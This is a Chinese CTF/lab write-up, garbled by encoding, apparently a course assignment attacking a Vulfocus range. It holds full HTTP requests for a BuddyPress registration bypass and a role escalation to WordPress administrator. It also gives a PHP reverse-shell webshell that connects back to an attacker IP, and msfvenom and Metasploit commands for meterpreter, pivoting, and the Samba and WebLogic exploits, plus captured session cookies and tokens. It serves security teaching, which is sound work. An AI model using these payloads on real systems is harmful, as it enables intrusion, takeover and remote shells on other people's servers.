#### ï¼ˆäºŒï¼‰æ³¨å†Œç»•è¿‡
1. **æŠ“åŒ…æ³¨å†Œè¯·æ±‚**
   - ä½¿ç”¨ Burp Suite æŠ“åŒ…ã€‚
   ![1747897930858](image/readme/1747897930858.png)
   - ç‚¹å‡»`send to repeater`ï¼Œæ„é€  POST è¯·æ±‚ï¼Œå‘é€åˆ° `/wp-json/buddypress/v1/signup`ã€‚
   - è¯·æ±‚ä½“å¦‚ä¸‹ï¼š
     ```json
     {
       "user_login": "attacker1",
       "user_email": "attacker1@163.com",
       "user_name": "attacker1",
       "password": "attacker1"
     }
     ```
    - æœ€ç»ˆæ„é€ çš„è¯·æ±‚åŒ…ï¼š
        ```
        POST /wp-json/buddypress/v1/signup HTTP/1.1
        Host: 192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112

        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```

    - æ›¿æ¢ `Host` ä¸ºè‡ªå·±çš„ IP å’Œç«¯å£ã€‚
    - å¾—åˆ°å›æ˜¾:
        ```
         HTTP/1.1 200 OK
         Date: Thu, 22 May 2025 03:48:36 GMT
         Server: Apache/2.4.18 (Ubuntu)
         X-Robots-Tag: noindex
         Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
         X-Content-Type-Options: nosniff
         Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
         Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
         Allow: POST
         Content-Length: 280
         Content-Type: application/json; charset=UTF-8
         [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
         ```
2. **æå–æ¿€æ´»å¯†é’¥**
   - å‘é€è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªå“åº”åŒ…ï¼Œå…¶ä¸­åŒ…å« `activation_key`ã€‚
   ![1747885758997](image/homework/1747885758997.png)
   `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
   - æå– `activation_key`ï¼Œç”¨äºåç»­çš„æ¿€æ´»æ“ä½œã€‚

3. **æ„é€ æ¿€æ´»è¯·æ±‚**
   - ä½¿ç”¨æå–çš„ `activation_key` æ„é€  PUT è¯·æ±‚ï¼Œå‘é€åˆ° `/wp-json/buddypress/v1/signup/activate/<activation_key>`ã€‚
   ![1747885790638](image/homework/1747885790638.png)
   - è¯·æ±‚ä½“ä¸æ³¨å†Œè¯·æ±‚ç›¸åŒã€‚
   - å®Œæ•´è¯·æ±‚åŒ…ï¼š
        ```
        PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112
        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```
    - **å¾—åˆ°å›æ˜¾:**
        ```
        HTTP/1.1 200 OK
        Date: Thu, 22 May 2025 03:49:29 GMT
        Server: Apache/2.4.18 (Ubuntu)
        X-Robots-Tag: noindex
        Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
        X-Content-Type-Options: nosniff
        Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
        Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
        Content-Length: 280
        Content-Type: application/json; charset=UTF-8
        [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
        ```

4. **ç™»å½•éªŒè¯**
   - ä½¿ç”¨æ³¨å†Œçš„è´¦å· `attacker1` å’Œå¯†ç  `attacker1` ç™»å½•ã€‚
   
   ![1747885902130](image/homework/1747885902130.png)
   - ç™»å½•åï¼Œç”¨æˆ·å°†è·å¾—æ™®é€šç”¨æˆ·æƒé™ï¼Œä½†å°šæœªè·å¾—ç®¡ç†å‘˜æƒé™ã€‚
   ![1747885938881](image/homework/1747885938881.png)
   ![1748069641307](image/readme/1748069641307.png)

#### ï¼ˆä¸‰ï¼‰è·å–ç®¡ç†å‘˜æƒé™
1. **åˆ›å»ºç”¨æˆ·ç»„**
   - è®¿é—® `http://<your_ip>:<your_port>/groups/create/step/group-details/`ã€‚
   - å¡«å†™ç»„ä¿¡æ¯å¹¶å®Œæˆåˆ›å»ºã€‚
   - é€šè¿‡åˆ›å»ºç”¨æˆ·ç»„ï¼Œç”¨æˆ·å°†è¢«æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼Œä¸ºåç»­çš„æƒé™æå‡åšå‡†å¤‡ã€‚
    ![1747888798026](image/homework/1747888798026.png)
    ![1747888866380](image/homework/1747888866380.png)
    ![1747888878196](image/homework/1747888878196.png)
    ![1747888898177](image/homework/1747888898177.png)
    ![1747888916532](image/homework/1747888916532.png)
    ![1747888936571](image/homework/1747888936571.png)
2. **æŠ“å–å…³é”®å‚æ•°**
   - ç‚¹å‡» `manage`ï¼Œå†ç‚¹å‡» `members`ï¼Œä½¿ç”¨æŠ“åŒ…å·¥å…·æŠ“å–è¯·æ±‚ã€‚
   - æå–è¯·æ±‚ä¸­çš„ `X-WP-Nonce` å’Œ `Cookie` å‚æ•°ã€‚
   ![1747889012605](image/homework/1747889012605.png)
    **cookie:**
        ```
        grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
        ```
        **X-WP-Nonce:** ``cb16f80772``

3. **æ„é€ ææƒè¯·æ±‚**
   - ä½¿ç”¨æå–çš„ `X-WP-Nonce` å’Œ `Cookie` æ„é€  POST è¯·æ±‚ï¼Œå‘é€åˆ° `/wp-json/buddypress/v1/members/me`ã€‚
   - è¯·æ±‚ä½“å¦‚ä¸‹ï¼š
     ```json
     {"roles": "administrator"}
     ```
   - å®Œæ•´è¯·æ±‚åŒ…ï¼š
        ```http
        POST /wp-json/buddypress/v1/members/me HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        X-WP-Nonce: cb16f80772
        Cookie: grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821SS
        Content-Type: application/json; charset=UTF-8
        Content-Length: 28
        {"roles": "administrator"}
        ```
     ![1747890470194](image/homework/1747890470194.png)
     ![1747890494107](image/homework/1747890494107.png)

4. **éªŒè¯ææƒç»“æœ**
   - å‘é€è¯·æ±‚åï¼Œç”¨æˆ·è§’è‰²å°†è¢«æå‡ä¸ºç®¡ç†å‘˜ã€‚
   - å†æ¬¡ç™»å½• WordPress åå°ï¼ŒéªŒè¯æ˜¯å¦è·å¾—ç®¡ç†å‘˜æƒé™ï¼Œå‘ç° dashboard é¡µé¢åŠŸèƒ½å¢åŠ ã€‚
   ![1747890528150](image/homework/1747890528150.png)

#### ï¼ˆå››ï¼‰ä¸Šä¼ æœ¨é©¬ï¼Œè·å– Shell
1. **ä¸Šä¼ æœ¨é©¬æ–‡ä»¶**
   - åœ¨ WordPress åå°ï¼Œç‚¹å‡» `Plugins` æ¨¡å—ï¼Œé€‰æ‹© `Add New`ã€‚
   ![1747890547884](image/homework/1747890547884.png)
   ![1747890578223](image/homework/1747890578223.png)
   - ç‚¹å‡» `Upload Plugin`ï¼Œä¸Šä¼ åŒ…å«ä¸€å¥è¯æœ¨é©¬çš„ PHP æ–‡ä»¶ã€‚
   ![1747890605964](image/homework/1747890605964.png)
   - æœ¨é©¬æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š
        ```php
        <?php
        $sock = fsockopen("192.168.168.10", 4444);
        $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        ?>
        ```
        ![1747890820999](image/homework/1747890820999.png)
2. **éªŒè¯æœ¨é©¬æ‰§è¡Œ**
   - ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—® `/wp-content/uploads/<year>/<month>/c.php`ã€‚
    ![1747890861599](image/homework/1747890861599.png)
    ![1747890872341](image/homework/1747890872341.png)
   **ç¬¬ä¸€ç§æ–¹æ³• :**
      - é€šè¿‡ URL å‚æ•° `cmd` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚ï¼š
         ```
         http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
         ```
      - å¦‚æœè¿”å›ç”¨æˆ· ID ä¿¡æ¯ï¼Œåˆ™è¯´æ˜æœ¨é©¬æ‰§è¡ŒæˆåŠŸï¼Œè·å¾—äº† Shellã€‚
      ![1747891827132](image/homework/1747891827132.png)
      ![1747891841145](image/homework/1747891841145.png)
      - ç”±æ­¤,æˆ‘ä»¬æ‰¾åˆ°/tmpç›®å½•ä¸‹çš„flag,å°†å…¶è¾“å…¥åˆ°åœºæ™¯flagä¸­,æˆåŠŸå¾—åˆ†
      flagä¸º`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
      ![1747891890594](image/homework/1747891890594.png)
   **ç¬¬äºŒç§æ–¹æ³• :**
      - æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ metasploit è·å–åå¼¹ shell
      ![1747893446502](image/homework/1747893446502.png)
      ![1747893462723](image/homework/1747893462723.png)


### æ­¥éª¤äºŒ è®¾ç«‹ç«‹è¶³ç‚¹å¹¶å‘ç°é¶æ ‡2-3

1. åœ¨æ”»å‡»è€…ä¸»æœºä¸Šç”Ÿæˆmeterpreter.elfæ–‡ä»¶
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<æ”»å‡»è€…ä¸»æœºIP> LPORT=<ç«¯å£> -f elf > meterpreter.elf`ï¼Œé€šè¿‡ä¸Šä¸€å±‚æ”»å‡»ä¸­æ¶‰åŠçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ æˆ‘ä»¬çš„meterpreter.elfæ–‡ä»¶ã€‚
<br>![](./pics/æ‰‹åŠ¨ç”Ÿæˆmeterpretershell.png)<br>
2. ä¸Šä¼ æ–‡ä»¶ï¼ˆè¦æ±‚å®Œæˆå…¥å£é¶æ ‡çš„ææƒè¡Œä¸ºï¼‰
![](./pics/ä¸Šä¼ æˆåŠŸ.png)<br>

3. æ”»å‡»è€…ä¸»æœºï¼Œåœ¨metasploité‡Œè®¾ç½®å¦‚ä¸‹å¹¶`run -j`ç­‰å¾…

```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost <æ”»å‡»è€…ä¸»æœºIP>
set lport <ç«¯å£>
run -j
```

æ³¨æ„ï¼Œè¿™é‡Œçš„IPå’Œç«¯å£è¦å’Œç”Ÿæˆ.elfæ–‡ä»¶æ—¶è®¾ç½®çš„ä¸€æ ·

5. åœ¨é¶æœºä¸Šè¿›å…¥å…¥å£é¶æ ‡çš„å®¹å™¨ï¼Œåœ¨é¶æœºé‡Œè¿è¡Œmeterpreter.elf
![](./pics/è¿›å…¥å®¹å™¨ä¸‹è½½æ–‡ä»¶å¹¶è¿è¡Œ.png)<br>

6. è¿”å›åˆ°æ”»å‡»è€…ä¸»æœºï¼Œå¯ä»¥çœ‹åˆ°è¿æ¥æˆåŠŸ
![](./pics/æ‹¿åˆ°meterpretershell.png)<br>

7. å‡çº§shell
`sessions -u <ä¼šè¯ç¼–å·>`
![](./pics/å‡çº§ä¼šè¯çª—å£.png)<br>

8. è¿›å…¥æ–°å¼€å¯çš„ä¼šè¯ï¼ŒæŸ¥çœ‹routeï¼Œarpï¼Œ ipconfig
`sessions -i <ä¼šè¯ç¼–å·>`
![](./pics/æŸ¥çœ‹arp.png)<br>
![](./pics/æŸ¥çœ‹route.png)<br>
![](./pics/ipconfig.png)<br>

9. è®¾ç½®pivotè·¯ç”±
![](./pics/æ·»åŠ pivotè·¯ç”±3.png)<br>

10. æ‰«æ
```bash
search portscan
use 0
set rhosts <ip>
set ports <ports>
set threads 10
run
```
![](./pics/æ‰«æç»“æœ1.png)<br>
æ‰«æ100%åæŸ¥çœ‹å­˜æ´»çš„ä¸»æœºå’ŒæœåŠ¡ï¼Œä½¿ç”¨`hosts`å’Œ`services`
![](./pics/å¼€æ”¾çš„ä¸»æœºå’ŒæœåŠ¡.png)<br>

11. è®¾ç½®ä»£ç†
å‚ç…§[æ•™å­¦è¯¾ä»¶](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)å’Œè§†é¢‘
![](./pics/socksä»£ç†.png)<br>
![](./pics/æŸ¥çœ‹1080ç«¯å£æœåŠ¡å¼€æ”¾æƒ…å†µ.png)<br>
`cat /etc/proxychains4.conf` 
ç¡®è®¤æœ‰ä»¥ä¸‹é…ç½®
![](./pics/ä¿®æ”¹proxychainsé…ç½®.png)<br>
å¹¶ä¸”é…ç½®æµè§ˆå™¨ä»£ç†,æ–¹ä¾¿ç›´æ¥ä»æµè§ˆå™¨è®¿é—®ç½‘é¡µ
![](./pics/ä»£ç†3.png)<br>

### æ­¥éª¤ä¸‰ é¶æ ‡2-3æ”»ç ´

#### samba
* Sambaæ˜¯åœ¨Linuxå’ŒUNIXç³»ç»Ÿä¸Šå®ç°SMBåè®®çš„ä¸€ä¸ªå…è´¹è½¯ä»¶ï¼Œç”±æœåŠ¡å™¨åŠå®¢æˆ·ç«¯ç¨‹åºæ„æˆã€‚SMBï¼ˆServer Messages Blockï¼Œä¿¡æ¯æœåŠ¡å—ï¼‰æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœºçš„ä¸€ç§é€šä¿¡åè®®ï¼Œå®ƒä¸ºå±€åŸŸç½‘å†…çš„ä¸åŒè®¡ç®—æœºä¹‹é—´æä¾›æ–‡ä»¶åŠæ‰“å°æœºç­‰èµ„æºçš„å…±äº«æœåŠ¡ã€‚SMBåè®®æ˜¯å®¢æˆ·æœº/æœåŠ¡å™¨å‹åè®®ï¼Œå®¢æˆ·æœºé€šè¿‡è¯¥åè®®å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„å…±äº«æ–‡ä»¶ç³»ç»Ÿã€æ‰“å°æœºåŠå…¶ä»–èµ„æºã€‚é€šè¿‡è®¾ç½®â€œNetBIOS over TCP/IPâ€ä½¿å¾—Sambaä¸ä½†èƒ½ä¸å±€åŸŸç½‘ç»œä¸»æœºåˆ†äº«èµ„æºï¼Œè¿˜èƒ½ä¸å…¨ä¸–ç•Œçš„ç”µè„‘åˆ†äº«èµ„æºã€‚

* 2017å¹´5æœˆ24æ—¥Sambaå‘å¸ƒäº†4.6.4ç‰ˆæœ¬ï¼Œä¸­é—´ä¿®å¤äº†ä¸€ä¸ªä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·CVE-2017-7494ï¼Œæ¼æ´å½±å“äº†Samba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬,ï¼Œç¡®è®¤å±äºä¸¥é‡æ¼æ´ï¼Œå¯ä»¥é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚

1. æ ¹æ®æ‰«æç»“æœæœç´¢å¯ç”¨æ”»å‡»æ¨¡å—å¹¶é€‰æ‹©åˆé€‚çš„æ¨¡å—ï¼Œè®¾ç½®åˆé€‚çš„optionsï¼Œè¿›è¡Œæ”»å‡»

```bash
search semba type:exploit
use exploit/linux/samba/is_know_pipname
# è®¾ç½®optionsï¼Œå¯ä»¥ä½¿ç”¨show optionsæŸ¥çœ‹éœ€è¦è®¾ç½®çš„å†…å®¹
# æ‰§è¡Œæ”»å‡»
run
```

![alt text](./pics/meta-samba.png)

2. get flag

![](./pics/getflag3.png)<br>

#### nginx

1. è®¾ç½®ä»£ç†curlæ‰«æåˆ°çš„IP
`proxychains curl http://192.170.84.2`
![](./pics/è®¿é—®ç¬¬äºŒå°ä¸»æœº.png)<br>

2. æ ¹æ®æç¤ºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤
`proxychains curl http://<ç›®æ ‡IP>/index.php?cmd=ls%20/tmp`
![](./pics/ç¬¬äºŒä¸ªflag.png)<br>



### æ­¥éª¤å›› è®¾ç«‹pivotè·¯ç”±å¹¶å‘ç°é¶æ ‡4-5

1. æŸ¥çœ‹ç¬¬ä¸€å±‚ä¸¤å°ä¸»æœºçš„ip

![](./pics/åŒç½‘å¡1.png)<br>
å¯ä»¥çœ‹åˆ°192.170.84.4è¿™ä¸€å°æœºå™¨æœ‰åŒç½‘å¡

2. å‡çº§å¯¹åº”çš„shell
![](./pics/å‡çº§shell1.png)<br>

3. è®¾ç½®pivotè·¯ç”±
![](./pics/æ·»åŠ pivotè·¯ç”±3.png)<br>

### æ­¥éª¤äº” é¶æ ‡4-5æ”»ç ´

#### weblogic

```bash
search cve-2019-2725
use 0
set Proxies socks5:127.0.0.1:1080
# è®¾ç½®é¶æœºIPç­‰
# ä¾‹ï¼š
# set rhosts 192.169.85.3
# è®¾ç½®å®Œæˆä»¥åå†è¿›è¡Œæ”»å‡»
run
```
ä¼šè¯çª—å£å¼€å¯ä»¥åï¼Œè¿›å…¥shellï¼Œè¾“å…¥ls /tmp
![](./pics/æ‹¿åˆ°flag3.png)

#### apache

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

![1748153067964](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153067964.png)

#### 2. ä¿¡æ¯æ”¶é›†

##### 2.1 åŸºç¡€ç«¯å£æ‰«æ

```bash
# æ‰«æ Apache æœåŠ¡ç«¯å£
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**æ‰«æç»“æœ**:

```
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nmap -sV -p 80,443,8080-8090 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 02:03 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up (0.0000020s latency).

PORT     STATE    SERVICE         VERSION
80/tcp   filtered http
443/tcp  closed   https
8080/tcp closed   http-proxy
8081/tcp closed   blackice-icecap
8082/tcp closed   blackice-alerts
8083/tcp closed   us-srv
8084/tcp closed   websnp
8085/tcp closed   unknown
8086/tcp closed   d-s-n
8087/tcp closed   simplifymedia
8088/tcp closed   radan-http
8089/tcp closed   unknown
8090/tcp closed   opsmessaging

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

![1748153021142](./image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153021142.png)

**æ‰«æç»“æœåˆ†æ**ï¼š

- å¸¸è§„HTTPç«¯å£(80, 443, 8080-8090)å‡æ˜¾ç¤ºä¸ºå…³é—­æˆ–è¿‡æ»¤çŠ¶æ€
- ApacheæœåŠ¡è¿è¡Œåœ¨éæ ‡å‡†ç«¯å£ä¸Šï¼Œé€šè¿‡Vulfocuså¹³å°åŠ¨æ€åˆ†é…ä¸º**13503ç«¯å£**
- éœ€è¦ç›´æ¥è®¿é—®æŒ‡å®šçš„æ˜ å°„ç«¯å£è¿›è¡Œåç»­ä¿¡æ¯æ”¶é›†

##### 2.2 Web æœåŠ¡è¯†åˆ«

é€šè¿‡æµè§ˆå™¨è®¿é—® Apache æœåŠ¡ `http://10.37.133.3:42286`ã€‚

![1748152989670](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748152989670.png)

##### 2.3 Apache ç‰ˆæœ¬æ£€æµ‹

```bash
# ä½¿ç”¨ curl è·å–æœåŠ¡å™¨ä¿¡æ¯
curl -I http://10.37.133.3:42286

# ä½¿ç”¨ nikto è¿›è¡Œ Web æ‰«æ
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153862204.png)

**curlå“åº”å¤´åˆ†æ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl -I http://10.37.133.3:42286

HTTP/1.1 200 OK
Date: Sun, 25 May 2025 06:04:51 GMT
Server: Apache/2.4.49 (Debian)
Last-Modified: Sat, 09 Oct 2021 03:58:16 GMT
ETag: "29cd-5cde381698600"
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```

**å…³é”®å‘ç°**ï¼š

- **æœåŠ¡å™¨ç‰ˆæœ¬**: `Apache/2.4.49 (Debian)` - **è¿™æ­£æ˜¯CVE-2021-41773æ¼æ´å½±å“çš„ç¡®åˆ‡ç‰ˆæœ¬**
- **æ“ä½œç³»ç»Ÿ**: Debian Linux
- **æ–‡ä»¶ä¿®æ”¹æ—¶é—´**: 2021-10-09ï¼Œä¸CVEæŠ«éœ²æ—¶é—´å»åˆ
- **å“åº”æ­£å¸¸**: HTTP 200çŠ¶æ€ç ï¼ŒæœåŠ¡å™¨æ­£å¸¸è¿è¡Œ

##### 2.4 Nikto å®‰å…¨æ‰«æ

**niktoæ‰«æç»“æœ**:
![1748153891702](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153891702.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nikto -h http://10.37.133.3:42286

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.37.133.3
+ Target Hostname:    10.37.133.3
+ Target Port:        42286
+ Start Time:         2025-05-25 02:04:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ Apache/2.4.49 appears to be outdated (current is at least Apache/2.4.54).
+ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5cde381698600, mtime: gzip.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ 8909 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-05-25 02:05:04 (GMT-4) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

**Niktoæ‰«æåˆ†æ**ï¼š

- **ç‰ˆæœ¬ç¡®è®¤**: å†æ¬¡ç¡®è®¤Apache/2.4.49ç‰ˆæœ¬ï¼Œ**æ˜ç¡®æ ‡æ³¨ä¸ºè¿‡æ—¶ç‰ˆæœ¬**
- **å®‰å…¨é…ç½®ç¼ºé™·**:
  - ç¼ºå°‘ `X-Frame-Options`å¤´(ç‚¹å‡»åŠ«æŒé˜²æŠ¤)
  - ç¼ºå°‘ `X-Content-Type-Options`å¤´(MIMEç±»å‹å—…æ¢é˜²æŠ¤)
- **ä¿¡æ¯æ³„éœ²**: ETagå¤´å¯èƒ½æ³„éœ²æœåŠ¡å™¨inodeä¿¡æ¯
- **HTTPæ–¹æ³•**: æ”¯æŒPOST, OPTIONS, HEAD, GETæ–¹æ³•
- **é‡è¦**: æ‰«æè¿‡ç¨‹ä¸­æœªè§¦å‘æ˜æ˜¾çš„å®‰å…¨æ‹¦æˆªï¼Œè¯´æ˜æœåŠ¡å™¨é…ç½®ç›¸å¯¹å®½æ¾

##### 2.5 ç›®å½•ç»“æ„æ¢æµ‹

```bash
# ä½¿ç”¨ dirb è¿›è¡Œç›®å½•æ‰«æ
dirb http://10.37.133.3:42286
```

**dirbæ‰«æç»“æœ**:
![1748153913104](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748153913104.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ dirb http://10.37.133.3:42286

-----------------
DIRB v2.22  
By The Dark Raver
-----------------

START_TIME: Sun May 25 02:05:11 2025
URL_BASE: http://10.37.133.3:42286/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                    

---- Scanning URL: http://10.37.133.3:42286/ ----
+ http://10.37.133.3:42286/cgi-bin/ (CODE:403|SIZE:279)                                                                                                                                        
+ http://10.37.133.3:42286/index.html (CODE:200|SIZE:10701)                                                                                                                                    
+ http://10.37.133.3:42286/server-status (CODE:403|SIZE:279)                                                                                                                                   
                                                                                                                                                                                               
-----------------
END_TIME: Sun May 25 02:05:12 2025
DOWNLOADED: 4612 - FOUND: 3
```

**ç›®å½•å‘ç°åˆ†æ**ï¼š

- **`/cgi-bin/` (403 Forbidden)**: **å…³é”®å‘ç°** - è¿™æ˜¯CVE-2021-41773æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒè·¯å¾„
  - 403çŠ¶æ€è¡¨æ˜ç›®å½•å­˜åœ¨ä½†è®¿é—®è¢«é™åˆ¶
  - CGIç›®å½•çš„å­˜åœ¨ä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†å…¥å£ç‚¹
- **`/index.html` (200 OK)**: æ ‡å‡†é¦–é¡µæ–‡ä»¶ï¼Œå¤§å°10701å­—èŠ‚
- **`/server-status` (403 Forbidden)**: ApacheçŠ¶æ€é¡µé¢ï¼Œè¢«ä¿æŠ¤ä½†å­˜åœ¨

